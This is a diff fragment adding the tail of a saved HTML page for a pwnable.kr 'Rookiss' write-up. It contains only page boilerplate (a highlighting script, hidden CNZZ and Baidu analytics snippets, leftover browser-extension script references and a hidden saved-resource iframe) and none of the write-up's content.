+<script src="./Rookiss Writeup [pwnable.kr]_files/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<!-- 网站统计代码 -->
+<div hidden="">
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1256394309'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s95.cnzz.com/z_stat.php%3Fid%3D1256394309%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script><span id="cnzz_stat_icon_1256394309"><a href="http://www.cnzz.com/stat/website.php?web_id=1256394309" target="_blank" title="站长统计"><img border="0" hspace="0" vspace="0" src="./Rookiss Writeup [pwnable.kr]_files/pic.gif"></a></span><script src="./Rookiss Writeup [pwnable.kr]_files/z_stat.php" type="text/javascript"></script><script src="./Rookiss Writeup [pwnable.kr]_files/core.php" charset="utf-8" type="text/javascript"></script>
+</div>
+<div hidden="">
+<script>
+var _hmt = _hmt || [];
+(function() {
+var hm = document.createElement("script");
+hm.src = "//hm.baidu.com/hm.js?3601be0ac702a94d879f3f571cec1e53";
+var s = document.getElementsByTagName("script")[0];
+s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</div>
+
+
+<script type="text/javascript" src="chrome-extension://jofjnbepnhcbfnpbhchillofcgpeopaj/js/public/common.js"></script><script type="text/javascript" src="chrome-extension://jofjnbepnhcbfnpbhchillofcgpeopaj/js/common/we-general.js"></script><iframe style="display: none;" src="./Rookiss Writeup [pwnable.kr]_files/saved_resource(2).html"></iframe></body><div></div></html>
